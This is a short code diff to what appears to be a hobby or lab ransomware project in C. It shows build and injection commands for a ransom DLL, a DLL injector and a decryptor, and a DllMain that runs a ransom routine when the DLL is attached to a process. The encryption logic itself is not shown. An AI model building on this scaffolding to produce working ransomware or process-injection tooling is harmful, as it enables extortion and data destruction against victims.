@@ -3,6 +3,7 @@
 
 // gcc -shared -o ransom_dll.dll ransom_dll.c ransom.c -lcrypto -lssl
 // gcc dll_injector.c -o dll_injector.exe
+// gcc decrypt.c -o decrypt.exe -lcrypto -lssl
 // ./dll_injector.exe <path> <pid>
 
 __declspec(dllexport) void run_ransom(void)
@@ -17,6 +18,7 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserv
     case DLL_PROCESS_ATTACH:
         MessageBoxA(NULL, "Ransom DLL attached to process", "Warning", MB_ICONEXCLAMATION);
         run_ransom();
+        MessageBoxA(NULL, "Ransomized!", "Warning", MB_ICONEXCLAMATION);
         break;
     case DLL_PROCESS_DETACH:
         MessageBoxA(NULL, "Ransom DLL detached from process", "Warning", MB_ICONEXCLAMATION);
